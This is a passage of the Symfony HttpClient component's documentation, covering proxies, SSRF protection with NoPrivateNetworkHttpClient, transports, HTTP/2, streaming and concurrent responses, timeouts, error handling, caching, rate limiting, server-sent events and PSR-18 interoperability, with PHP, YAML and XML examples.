nothing to configure to have the client work with\nproxies, provided these env vars are properly configured.\n\nYou can still set or override these settings using the ``proxy`` and ``no_proxy``\noptions:\n\n* ``proxy`` should be set to the ``http://...`` URL of the proxy to get through\n\n* ``no_proxy`` disables the proxy for a comma-separated list of hosts that do not\n  require it to get reached.\n\nProgress Callback\n~~~~~~~~~~~~~~~~~\n\nBy providing a callable to the ``on_progress`` option, one can track\nuploads/downloads as they complete. This callback is guaranteed to be called on\nDNS resolution, on arrival of headers and on completion; additionally it is\ncalled when new data is uploaded or downloaded and at least once per second::\n\n    $response = $client->request('GET', 'https://...', [\n        'on_progress' => function (int $dlNow, int $dlSize, array $info): void {\n            // $dlNow is the number of bytes downloaded so far\n            // $dlSize is the total size to be downloaded or -1 if it is unknown\n            // $info is what $response->getInfo() would return at this very time\n        },\n    ]);\n\nAny exceptions thrown from the callback will be wrapped in an instance of\n:class:`Symfony\\\\Contracts\\\\HttpClient\\\\Exception\\\\TransportExceptionInterface`\nand will abort the request.\n\nHTTPS Certificates\n~~~~~~~~~~~~~~~~~~\n\nHttpClient uses the system's certificate store to validate SSL certificates\n(while browsers use their own stores). When using self-signed certificates\nduring development, it's recommended to create your own certificate authority\n(CA) and add it to your system's store.\n\nAlternatively, you can also disable ``verify_host`` and ``verify_peer`` (see\n:ref:`http_client config reference <reference-http-client>`), but this is not\nrecommended in production.\n\nSSRF (Server-side request forgery) Handling\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n`SSRF`_ allows an attacker to induce the backend application to make HTTP\nrequests to an arbitrary domain. These attacks can also target the internal\nhosts and IPs of the attacked server.\n\nIf you use an :class:`Symfony\\\\Component\\\\HttpClient\\\\HttpClient` together\nwith user-provided URIs, it is probably a good idea to decorate it with a\n:class:`Symfony\\\\Component\\\\HttpClient\\\\NoPrivateNetworkHttpClient`. This will\nensure local networks are made inaccessible to the HTTP client::\n\n    use Symfony\\Component\\HttpClient\\HttpClient;\n    use Symfony\\Component\\HttpClient\\NoPrivateNetworkHttpClient;\n\n    $client = new NoPrivateNetworkHttpClient(HttpClient::create());\n    // nothing changes when requesting public networks\n    $client->request('GET', 'https://example.com/');\n\n    // however, all requests to private networks are now blocked by default\n    $client->request('GET', 'http://localhost/');\n\n    // the second optional argument defines the networks to block\n    // in this example, requests from 104.26.14.0 to 104.26.15.255 will result in an exception\n    // but all the other requests, including other internal networks, will be allowed\n    $client = new NoPrivateNetworkHttpClient(HttpClient::create(), ['104.26.14.0/23']);\n\nProfiling\n~~~~~~~~~\n\nWhen you are using the :class:`Symfony\\\\Component\\\\HttpClient\\\\TraceableHttpClient`,\nresponses content will be kept in memory and may exhaust it.\n\nYou can disable this behavior by setting the ``extra.trace_content`` option to ``false``\nin your requests::\n\n    $response = $client->request('GET', 'https://...', [\n        'extra' => ['trace_content' => false],\n    ]);\n\nThis setting won’t affect other clients.\n\nUsing URI Templates\n~~~~~~~~~~~~~~~~~~~\n\nThe :class:`Symfony\\\\Component\\\\HttpClient\\\\UriTemplateHttpClient` provides\na client that eases the use of URI templates, as described in the `RFC 6570`_::\n\n    $client = new UriTemplateHttpClient();\n\n    // this will make a request to the URL http://example.org/users?page=1\n    $client->request('GET', 'http://example.org/{resource}{?page}', [\n        'vars' => [\n            'resource' => 'users',\n            'page' => 1,\n        ],\n    ]);\n\nBefore using URI templates in your applications, you must install a third-party\npackage that expands those URI templates to turn them into URLs:\n\n.. code-block:: terminal\n\n    $ composer require league/uri\n\n    # Symfony also supports the following URI template packages:\n    # composer require guzzlehttp/uri-template\n    # composer require rize/uri-template\n\nWhen using this client in the framework context, all existing HTTP clients\nare decorated by the :class:`Symfony\\\\Component\\\\HttpClient\\\\UriTemplateHttpClient`.\nThis means that URI template feature is enabled by default for all HTTP clients\nyou may use in your application.\n\nYou can configure variables that will be replaced globally in all URI templates\nof your application:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            http_client:\n                default_options:\n                    vars:\n                        - secret: 'secret-token'\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:http-client>\n                    <framework:default-options>\n                        <framework:vars name=\"secret\">secret-token</framework:vars>\n                    </framework:default-options>\n                </framework:http-client>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework) {\n            $framework->httpClient()\n                ->defaultOptions()\n                    ->vars(['secret' => 'secret-token'])\n            ;\n        };\n\nIf you want to define your own logic to handle variables of URI templates, you\ncan do so by redefining the ``http_client.uri_template_expander`` alias. Your\nservice must be invokable.\n\nPerformance\n-----------\n\nThe component is built for maximum HTTP performance. By design, it is compatible\nwith HTTP/2 and with doing concurrent asynchronous streamed and multiplexed\nrequests/responses. Even when doing regular synchronous calls, this design\nallows keeping connections to remote hosts open between requests, improving\nperformance by saving repetitive DNS resolution, SSL negotiation, etc.\nTo leverage all these design benefits, the cURL extension is needed.\n\nEnabling cURL Support\n~~~~~~~~~~~~~~~~~~~~~\n\nThis component can make HTTP requests using native PHP streams and the\n``amphp/http-client`` and cURL libraries. Although they are interchangeable and\nprovide the same features, including concurrent requests, HTTP/2 is only supported\nwhen using cURL or ``amphp/http-client``.\n\n.. note::\n\n    To use the :class:`Symfony\\\\Component\\\\HttpClient\\\\AmpHttpClient`, the\n    `amphp/http-client`_ package must be installed.\n\nThe :method:`Symfony\\\\Component\\\\HttpClient\\\\HttpClient::create` method\nselects the cURL transport if the `cURL PHP extension`_ is enabled. It falls\nback to ``AmpHttpClient`` if cURL couldn't be found or is too old. Finally, if\n``AmpHttpClient`` is not available, it falls back to PHP streams.\nIf you prefer to select the transport explicitly, use the following classes\nto create the client::\n\n    use Symfony\\Component\\HttpClient\\AmpHttpClient;\n    use Symfony\\Component\\HttpClient\\CurlHttpClient;\n    use Symfony\\Component\\HttpClient\\NativeHttpClient;\n\n    // uses native PHP streams\n    $client = new NativeHttpClient();\n\n    // uses the cURL PHP extension\n    $client = new CurlHttpClient();\n\n    // uses the client from the `amphp/http-client` package\n    $client = new AmpHttpClient();\n\nWhen using this component in a full-stack Symfony application, this behavior is\nnot configurable and cURL will be used automatically if the cURL PHP extension\nis installed and enabled, and will fall back as explained above.\n\nConfiguring CurlHttpClient Options\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nPHP allows to configure lots of `cURL options`_ via the :phpfunction:`curl_setopt`\nfunction. In order to make the component more portable when not using cURL, the\n:class:`Symfony\\\\Component\\\\HttpClient\\\\CurlHttpClient` only uses some of those\noptions (and they are ignored in the rest of clients).\n\nAdd an ``extra.curl`` option in your configuration to pass those extra options::\n\n    use Symfony\\Component\\HttpClient\\CurlHttpClient;\n\n    $client = new CurlHttpClient();\n\n    $client->request('POST', 'https://...', [\n        // ...\n        'extra' => [\n            'curl' => [\n                CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V6,\n            ],\n        ],\n    ]);\n\n.. note::\n\n    Some cURL options are impossible to override (e.g. because of thread safety)\n    and you'll get an exception when trying to override them.\n\nHTTP Compression\n~~~~~~~~~~~~~~~~\n\nThe HTTP header ``Accept-Encoding: gzip`` is added automatically if:\n\n* using cURL client: cURL was compiled with ZLib support (see ``php --ri curl``)\n* using the native HTTP client: `Zlib PHP extension`_ is installed\n\nIf the server does respond with a gzipped response, it's decoded transparently.\nTo disable HTTP compression, send an ``Accept-Encoding: identity`` HTTP header.\n\nChunked transfer encoding is enabled automatically if both your PHP runtime and\nthe remote server support it.\n\n.. warning::\n\n    If you set ``Accept-Encoding`` to e.g. ``gzip``, you will need to handle the\n    decompression yourself.\n\nHTTP/2 Support\n~~~~~~~~~~~~~~\n\nWhen requesting an ``https`` URL, HTTP/2 is enabled by default if one of the\nfollowing tools is installed:\n\n* The `libcurl`_ package version 7.36 or higher, used with PHP >= 7.2.17 / 7.3.4;\n* The `amphp/http-client`_ Packagist package version 4.2 or higher.\n\nTo force HTTP/2 for ``http`` URLs, you need to enable it explicitly via the\n``http_version`` option:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            http_client:\n                default_options:\n                    http_version: '2.0'\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:http-client>\n                    <framework:default-options http-version=\"2.0\"/>\n                </framework:http-client>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->httpClient()\n                ->defaultOptions()\n                    ->httpVersion('2.0')\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        $client = HttpClient::create(['http_version' => '2.0']);\n\nSupport for HTTP/2 PUSH works out of the box when using a compatible client:\npushed responses are put into a temporary cache and are used when a\nsubsequent request is triggered for the corresponding URLs.\n\nProcessing Responses\n--------------------\n\nThe response returned by all HTTP clients is an object of type\n:class:`Symfony\\\\Contracts\\\\HttpClient\\\\ResponseInterface` which provides the\nfollowing methods::\n\n    $response = $client->request('GET', 'https://...');\n\n    // gets the HTTP status code of the response\n    $statusCode = $response->getStatusCode();\n\n    // gets the HTTP headers as string[][] with the header names lower-cased\n    $headers = $response->getHeaders();\n\n    // gets the response body as a string\n    $content = $response->getContent();\n\n    // casts the response JSON content to a PHP array\n    $content = $response->toArray();\n\n    // casts the response content to a PHP stream resource\n    $content = $response->toStream();\n\n    // cancels the request/response\n    $response->cancel();\n\n    // returns info coming from the transport layer, such as \"response_headers\",\n    // \"redirect_count\", \"start_time\", \"redirect_url\", etc.\n    $httpInfo = $response->getInfo();\n\n    // you can get individual info too\n    $startTime = $response->getInfo('start_time');\n    // e.g. this returns the final response URL (resolving redirections if needed)\n    $url = $response->getInfo('url');\n\n    // returns detailed logs about the requests and responses of the HTTP transaction\n    $httpLogs = $response->getInfo('debug');\n\n    // the special \"pause_handler\" info item is a callable that allows to delay the request\n    // for a given number of seconds; this allows you to delay retries, throttle streams, etc.\n    $response->getInfo('pause_handler')(2);\n\n.. note::\n\n    ``$response->toStream()`` is part of :class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\StreamableInterface`.\n\n.. note::\n\n    ``$response->getInfo()`` is non-blocking: it returns *live* information\n    about the response. Some of them might not be known yet (e.g. ``http_code``)\n    when you'll call it.\n\n.. _http-client-streaming-responses:\n\nStreaming Responses\n~~~~~~~~~~~~~~~~~~~\n\nCall the :method:`Symfony\\\\Contracts\\\\HttpClient\\\\HttpClientInterface::stream`\nmethod to get *chunks* of the response sequentially instead of waiting for the\nentire response::\n\n    $url = 'https://releases.ubuntu.com/18.04.1/ubuntu-18.04.1-desktop-amd64.iso';\n    $response = $client->request('GET', $url);\n\n    // Responses are lazy: this code is executed as soon as headers are received\n    if (200 !== $response->getStatusCode()) {\n        throw new \\Exception('...');\n    }\n\n    // get the response content in chunks and save them in a file\n    // response chunks implement Symfony\\Contracts\\HttpClient\\ChunkInterface\n    $fileHandler = fopen('/ubuntu.iso', 'w');\n    foreach ($client->stream($response) as $chunk) {\n        fwrite($fileHandler, $chunk->getContent());\n    }\n\n.. note::\n\n    By default, ``text/*``, JSON and XML response bodies are buffered in a local\n    ``php://temp`` stream. You can control this behavior by using the ``buffer``\n    option: set it to ``true``/``false`` to enable/disable buffering, or to a\n    closure that should return the same based on the response headers it receives\n    as an argument.\n\nCanceling Responses\n~~~~~~~~~~~~~~~~~~~\n\nTo abort a request (e.g. because it didn't complete in due time, or you want to\nfetch only the first bytes of the response, etc.), you can either use the\n:method:`Symfony\\\\Contracts\\\\HttpClient\\\\ResponseInterface::cancel`::\n\n    $response->cancel();\n\nOr throw an exception from a progress callback::\n\n    $response = $client->request('GET', 'https://...', [\n        'on_progress' => function (int $dlNow, int $dlSize, array $info): void {\n            // ...\n\n            throw new \\MyException();\n        },\n    ]);\n\nThe exception will be wrapped in an instance of\n:class:`Symfony\\\\Contracts\\\\HttpClient\\\\Exception\\\\TransportExceptionInterface`\nand will abort the request.\n\nIn case the response was canceled using ``$response->cancel()``,\n``$response->getInfo('canceled')`` will return ``true``.\n\nHandling Exceptions\n~~~~~~~~~~~~~~~~~~~\n\nThere are three types of exceptions, all of which implement the\n:class:`Symfony\\\\Contracts\\\\HttpClient\\\\Exception\\\\ExceptionInterface`:\n\n* Exceptions implementing the :class:`Symfony\\\\Contracts\\\\HttpClient\\\\Exception\\\\HttpExceptionInterface`\n  are thrown when your code does not handle the status codes in the 300-599 range.\n\n* Exceptions implementing the :class:`Symfony\\\\Contracts\\\\HttpClient\\\\Exception\\\\TransportExceptionInterface`\n  are thrown when a lower level issue occurs.\n\n* Exceptions implementing the :class:`Symfony\\\\Contracts\\\\HttpClient\\\\Exception\\\\DecodingExceptionInterface`\n  are thrown when a content-type cannot be decoded to the expected representation.\n\nWhen the HTTP status code of the response is in the 300-599 range (i.e. 3xx,\n4xx or 5xx), the ``getHeaders()``, ``getContent()`` and ``toArray()`` methods\nthrow an appropriate exception, all of which implement the\n:class:`Symfony\\\\Contracts\\\\HttpClient\\\\Exception\\\\HttpExceptionInterface`.\n\nTo opt-out from this exception and deal with 300-599 status codes on your own,\npass ``false`` as the optional argument to every call of those methods,\ne.g. ``$response->getHeaders(false);``.\n\nIf you do not call any of these 3 methods at all, the exception will still be thrown\nwhen the ``$response`` object is destructed.\n\nCalling ``$response->getStatusCode()`` is enough to disable this behavior\n(but then don't miss checking the status code yourself).\n\nWhile responses are lazy, their destructor will always wait for headers to come\nback. This means that the following request *will* complete; and if e.g. a 404\nis returned, an exception will be thrown::\n\n    // because the returned value is not assigned to a variable, the destructor\n    // of the returned response will be called immediately and will throw if the\n    // status code is in the 300-599 range\n    $client->request('POST', 'https://...');\n\nThis in turn means that unassigned responses will fallback to synchronous requests.\nIf you want to make these requests concurrent, you can store their corresponding\nresponses in an array::\n\n    $responses[] = $client->request('POST', 'https://.../path1');\n    $responses[] = $client->request('POST', 'https://.../path2');\n    // ...\n\n    // This line will trigger the destructor of all responses stored in the array;\n    // they will complete concurrently and an exception will be thrown in case a\n    // status code in the 300-599 range is returned\n    unset($responses);\n\nThis behavior provided at destruction-time is part of the fail-safe design of the\ncomponent. No errors will be unnoticed: if you don't write the code to handle\nerrors, exceptions will notify you when needed. On the other hand, if you write\nthe error-handling code (by calling ``$response->getStatusCode()``), you will\nopt-out from these fallback mechanisms as the destructor won't have anything\nremaining to do.\n\nConcurrent Requests\n-------------------\n\nThanks to responses being lazy, requests are always managed concurrently.\nOn a fast enough network, the following code makes 379 requests in less than\nhalf a second when cURL is used::\n\n    $responses = [];\n    for ($i = 0; $i < 379; ++$i) {\n        $uri = \"https://http2.akamai.com/demo/tile-$i.png\";\n        $responses[] = $client->request('GET', $uri);\n    }\n\n    foreach ($responses as $response) {\n        $content = $response->getContent();\n        // ...\n    }\n\nAs you can read in the first \"for\" loop, requests are issued but are not consumed\nyet. That's the trick when concurrency is desired: requests should be sent\nfirst and be read later on. This will allow the client to monitor all pending\nrequests while your code waits for a specific one, as done in each iteration of\nthe above \"foreach\" loop.\n\n.. note::\n\n    The maximum number of concurrent requests that you can perform depends on\n    the resources of your machine (e.g. your operating system may limit the\n    number of simultaneous reads of the file that stores the certificates\n    file). Make your requests in batches to avoid these issues.\n\nMultiplexing Responses\n~~~~~~~~~~~~~~~~~~~~~~\n\nIf you look again at the snippet above, responses are read in requests' order.\nBut maybe the 2nd response came back before the 1st? Fully asynchronous operations\nrequire being able to deal with the responses in whatever order they come back.\n\nIn order to do so, the\n:method:`Symfony\\\\Contracts\\\\HttpClient\\\\HttpClientInterface::stream`\naccepts a list of responses to monitor. As mentioned\n:ref:`previously <http-client-streaming-responses>`, this method yields response\nchunks as they arrive from the network. By replacing the \"foreach\" in the\nsnippet with this one, the code becomes fully async::\n\n    foreach ($client->stream($responses) as $response => $chunk) {\n        if ($chunk->isFirst()) {\n            // headers of $response just arrived\n            // $response->getHeaders() is now a non-blocking call\n        } elseif ($chunk->isLast()) {\n            // the full content of $response just completed\n            // $response->getContent() is now a non-blocking call\n        } else {\n            // $chunk->getContent() will return a piece\n            // of the response body that just arrived\n        }\n    }\n\n.. tip::\n\n    Use the ``user_data`` option combined with ``$response->getInfo('user_data')``\n    to track the identity of the responses in your foreach loops.\n\nDealing with Network Timeouts\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThis component allows dealing with both request and response timeouts.\n\nA timeout can happen when e.g. DNS resolution takes too much time, when the TCP\nconnection cannot be opened in the given time budget, or when the response\ncontent pauses for too long. This can be configured with the ``timeout`` request\noption::\n\n    // A TransportExceptionInterface will be issued if nothing\n    // happens for 2.5 seconds when accessing from the $response\n    $response = $client->request('GET', 'https://...', ['timeout' => 2.5]);\n\nThe ``default_socket_timeout`` PHP ini setting is used if the option is not set.\n\nThe option can be overridden by using the 2nd argument of the ``stream()`` method.\nThis allows monitoring several responses at once and applying the timeout to all\nof them in a group. If all responses become inactive for the given duration, the\nmethod will yield a special chunk whose ``isTimeout()`` will return ``true``::\n\n    foreach ($client->stream($responses, 1.5) as $response => $chunk) {\n        if ($chunk->isTimeout()) {\n            // $response stale for more than 1.5 seconds\n        }\n    }\n\nA timeout is not necessarily an error: you can decide to stream again the\nresponse and get remaining contents that might come back in a new timeout, etc.\n\n.. tip::\n\n    Passing ``0`` as timeout allows monitoring responses in a non-blocking way.\n\n.. note::\n\n    Timeouts control how long one is willing to wait *while the HTTP transaction\n    is idle*. Big responses can last as long as needed to complete, provided they\n    remain active during the transfer and never pause for longer than specified.\n\n    Use the ``max_duration`` option to limit the time a full request/response can last.\n\n.. _http-client_network-errors:\n\nDealing with Network Errors\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nNetwork errors (broken pipe, failed DNS resolution, etc.) are thrown as instances\nof :class:`Symfony\\\\Contracts\\\\HttpClient\\\\Exception\\\\TransportExceptionInterface`.\n\nFirst of all, you don't *have* to deal with them: letting errors bubble to your\ngeneric exception-handling stack might be really fine in most use cases.\n\nIf you want to handle them, here is what you need to know:\n\nTo catch errors, you need to wrap calls to ``$client->request()`` but also calls\nto any methods of the returned responses. This is because responses are lazy, so\nthat network errors can happen when calling e.g. ``getStatusCode()`` too::\n\n    use Symfony\\Contracts\\HttpClient\\Exception\\TransportExceptionInterface;\n\n    // ...\n    try {\n        // both lines can potentially throw\n        $response = $client->request(/* ... */);\n        $headers = $response->getHeaders();\n        // ...\n    } catch (TransportExceptionInterface $e) {\n        // ...\n    }\n\n.. note::\n\n    Because ``$response->getInfo()`` is non-blocking, it shouldn't throw by design.\n\nWhen multiplexing responses, you can deal with errors for individual streams by\ncatching :class:`Symfony\\\\Contracts\\\\HttpClient\\\\Exception\\\\TransportExceptionInterface`\nin the foreach loop::\n\n    foreach ($client->stream($responses) as $response => $chunk) {\n        try {\n            if ($chunk->isTimeout()) {\n                // ... decide what to do when a timeout occurs\n                // if you want to stop a response that timed out, don't miss\n                // calling $response->cancel() or the destructor of the response\n                // will try to complete it one more time\n            } elseif ($chunk->isFirst()) {\n                // if you want to check the status code, you must do it when the\n                // first chunk arrived, using $response->getStatusCode();\n                // not doing so might trigger an HttpExceptionInterface\n            } elseif ($chunk->isLast()) {\n                // ... do something with $response\n            }\n        } catch (TransportExceptionInterface $e) {\n            // ...\n        }\n    }\n\nCaching Requests and Responses\n------------------------------\n\nThis component provides a :class:`Symfony\\\\Component\\\\HttpClient\\\\CachingHttpClient`\ndecorator that allows caching responses and serving them from the local storage\nfor next requests. The implementation leverages the\n:class:`Symfony\\\\Component\\\\HttpKernel\\\\HttpCache\\\\HttpCache` class under the hood\nso that the :doc:`HttpKernel component </components/http_kernel>` needs to be\ninstalled in your application::\n\n    use Symfony\\Component\\HttpClient\\CachingHttpClient;\n    use Symfony\\Component\\HttpClient\\HttpClient;\n    use Symfony\\Component\\HttpKernel\\HttpCache\\Store;\n\n    $store = new Store('/path/to/cache/storage/');\n    $client = HttpClient::create();\n    $client = new CachingHttpClient($client, $store);\n\n    // this won't hit the network if the resource is already in the cache\n    $response = $client->request('GET', 'https://example.com/cacheable-resource');\n\n:class:`Symfony\\\\Component\\\\HttpClient\\\\CachingHttpClient` accepts a third argument\nto set the options of the :class:`Symfony\\\\Component\\\\HttpKernel\\\\HttpCache\\\\HttpCache`.\n\nLimit the Number of Requests\n----------------------------\n\nThis component provides a :class:`Symfony\\\\Component\\\\HttpClient\\\\ThrottlingHttpClient`\ndecorator that allows to limit the number of requests within a certain period,\npotentially delaying calls based on the rate limiting policy.\n\nThe implementation leverages the\n:class:`Symfony\\\\Component\\\\RateLimiter\\\\LimiterInterface` class under the hood\nso the :doc:`Rate Limiter component </rate_limiter>` needs to be\ninstalled in your application::\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            http_client:\n                scoped_clients:\n                    example.client:\n                        base_uri: 'https://example.com'\n                        rate_limiter: 'http_example_limiter'\n\n            rate_limiter:\n                # Don't send more than 10 requests in 5 seconds\n                http_example_limiter:\n                    policy: 'token_bucket'\n                    limit: 10\n                    rate: { interval: '5 seconds', amount: 10 }\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:http-client>\n                    <framework:scoped-client name=\"example.client\"\n                        base-uri=\"https://example.com\"\n                        rate-limiter=\"http_example_limiter\"\n                    />\n                </framework:http-client>\n\n                <framework:rate-limiter>\n                    <!-- Don't send more than 10 requests in 5 seconds -->\n                    <framework:limiter name=\"http_example_limiter\"\n                        policy=\"token_bucket\"\n                        limit=\"10\"\n                    >\n                        <framework:rate interval=\"5 seconds\" amount=\"10\"/>\n                    </framework:limiter>\n                </framework:rate-limiter>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->httpClient()->scopedClient('example.client')\n                ->baseUri('https://example.com')\n                ->rateLimiter('http_example_limiter');\n                // ...\n            ;\n\n            $framework->rateLimiter()\n                // Don't send more than 10 requests in 5 seconds\n                ->limiter('http_example_limiter')\n                    ->policy('token_bucket')\n                    ->limit(10)\n                    ->rate()\n                        ->interval('5 seconds')\n                        ->amount(10)\n                ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HttpClient\\HttpClient;\n        use Symfony\\Component\\HttpClient\\ThrottlingHttpClient;\n        use Symfony\\Component\\RateLimiter\\RateLimiterFactory;\n        use Symfony\\Component\\RateLimiter\\Storage\\InMemoryStorage;\n\n        $factory = new RateLimiterFactory([\n            'id' => 'http_example_limiter',\n            'policy' => 'token_bucket',\n            'limit' => 10,\n            'rate' => ['interval' => '5 seconds', 'amount' => 10],\n        ], new InMemoryStorage());\n        $limiter = $factory->create();\n\n        $client = HttpClient::createForBaseUri('https://example.com');\n        $throttlingClient = new ThrottlingHttpClient($client, $limiter);\n\n.. versionadded:: 7.1\n\n    The :class:`Symfony\\\\Component\\\\HttpClient\\\\ThrottlingHttpClient` was\n    introduced in Symfony 7.1.\n\nConsuming Server-Sent Events\n----------------------------\n\n`Server-sent events`_ is an Internet standard used to push data to web pages.\nIts JavaScript API is built around an `EventSource`_ object, which listens to\nthe events sent from some URL. The events are a stream of data (served with the\n``text/event-stream`` MIME type) with the following format:\n\n.. code-block:: text\n\n    data: This is the first message.\n\n    data: This is the second message, it\n    data: has two lines.\n\n    data: This is the third message.\n\nSymfony's HTTP client provides an EventSource implementation to consume these\nserver-sent events. Use the :class:`Symfony\\\\Component\\\\HttpClient\\\\EventSourceHttpClient`\nto wrap your HTTP client, open a connection to a server that responds with a\n``text/event-stream`` content type and consume the stream as follows::\n\n    use Symfony\\Component\\HttpClient\\Chunk\\ServerSentEvent;\n    use Symfony\\Component\\HttpClient\\EventSourceHttpClient;\n\n    // the second optional argument is the reconnection time in seconds (default = 10)\n    $client = new EventSourceHttpClient($client, 10);\n    $source = $client->connect('https://localhost:8080/events');\n    while ($source) {\n        foreach ($client->stream($source, 2) as $r => $chunk) {\n            if ($chunk->isTimeout()) {\n                // ...\n                continue;\n            }\n\n            if ($chunk->isLast()) {\n                // ...\n\n                return;\n            }\n\n            // this is a special ServerSentEvent chunk holding the pushed message\n            if ($chunk instanceof ServerSentEvent) {\n                // do something with the server event ...\n            }\n        }\n    }\n\n.. tip::\n\n    If you know that the content of the ``ServerSentEvent`` is in the JSON format, you can\n    use the :method:`Symfony\\\\Component\\\\HttpClient\\\\Chunk\\\\ServerSentEvent::getArrayData`\n    method to directly get the decoded JSON as array.\n\nInteroperability\n----------------\n\nThe component is interoperable with four different abstractions for HTTP\nclients: `Symfony Contracts`_, `PSR-18`_, `HTTPlug`_ v1/v2 and native PHP streams.\nIf your application uses libraries that need any of them, the component is compatible\nwith all of them. They also benefit from :ref:`autowiring aliases <service-autowiring-alias>`\nwhen the :doc:`framework bundle </reference/configuration/framework>` is used.\n\nIf you are writing or maintaining a library that makes HTTP requests, you can\ndecouple it from any specific HTTP client implementations by coding against\neither Symfony Contracts (recommended), PSR-18 or HTTPlug v2.\n\nSymfony Contracts\n~~~~~~~~~~~~~~~~~\n\nThe interfaces found in the ``symfony/http-client-contracts`` package define\nthe primary abstractions implemented by the component. Its entry point is the\n:class:`Symfony\\\\Contracts\\\\HttpClient\\\\HttpClientInterface`. That's the\ninterface you need to code against when a client is needed::\n\n    use Symfony\\Contracts\\HttpClient\\HttpClientInterface;\n\n    class MyApiLayer\n    {\n        public function __construct(\n            private HttpClientInterface $client,\n        ) {\n        }\n\n        // [...]\n    }\n\nAll request options mentioned above (e.g. timeout management) are also defined\nin the wordings of the interface, so that any compliant implementations (like\nthis component) is guaranteed to provide them. That's a major difference with\nthe other abstractions, which provide none related to the transport itself.\n\nAnother major feature covered by the Symfony Contracts is async/multiplexing,\nas described in the previous sections.\n\nPSR-18 and PSR-17\n~~~~~~~~~~~~~~~~~\n\nThis component implements the `PSR-18`_ (HTTP Client) specifications via the\n:class:`Symfony\\\\Component\\\\HttpClient\\\\Psr18Client` class, which is an adapter\nto turn a Symfony :class:`Symfony\\\\Contracts\\\\HttpClient\\\\HttpClientInterface`\ninto a PSR-18 ``ClientInterface``. This class also implements the relevant\nmethods of `PSR-17`_ to ease creating request objects.\n\nTo use it, you need the ``psr/http-client`` package and a `PSR-17`_ implementation:\n\n.. code-block:: terminal\n\n    # installs the PSR-18 ClientInterface\n    $ composer require psr/http-client\n\n    # installs an efficient implementation of response and stream factories\n    # with autowiring aliases provided by Symfony Flex\n    $ composer require nyholm/psr7\n\n    # alternatively, install the php-http/discovery package to auto-discover\n    # any already installed implementations from common vendors:\n    # composer require php-http/discovery\n\nNow you can make HTTP requests with the PSR-18 client as follows:\n\n.. configuration-block::\n\n    .. code-block:: php-symfony\n\n        use Psr\\Http\\Client\\ClientInterface;\n\n        class Symfony\n        {\n            public function __construct(\n                private ClientInterface $client,\n            ) {\n            }\n\n            public function getAvailableVersions(): array\n            {\n                $request = $this->client->createRequest('GET', 'https://symfony.com/versions.json');\n                $response = $this->client->sendRequest($request);\n\n                return json_decode($response->getBody()->getContents(), true);\n            }\n        }\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HttpClient\\Psr18Client;\n\n        $client = new Psr18Client();\n\n        $request = $client->createRequest('GET', 'https://symfony.com/versions.json');\n        $response = $client->sendRequest($request);\n\n        $content = json_decode($response->getBody()->getContents(), true);\n\nYou can also pass a set of default options to your client thanks to the\n``Psr18Client::withOptions()`` method::\n\n    use Symfony\\Component\\HttpClient\\Psr18Client;\n\n    $client = (new Psr18Client())\n        ->withOptions([\n            'base_uri' => 'https://symfony.com',\n            'headers' => [\n                'Accept' => 'application/json',\n            ],\n        ]);\n\n    $request = $client->createRequest('GET', '/versions.json');\n\n    // ...\n\nHTTPlug\n~~~~~~~\n\nThe `HTTPlug`_ v1 specification was published before PSR-18 and is superseded by\nit. As such, you should not use it in newly written code. The component is still\ninteroperable with libraries that require it thanks to the\n:class:`Symfony\\\\Component\\\\HttpClient\\\\HttplugClient` class. Similarly to\n:class:`Symfony\\\\Component\\\\HttpClient\\\\Psr18Client` implementing relevant parts of 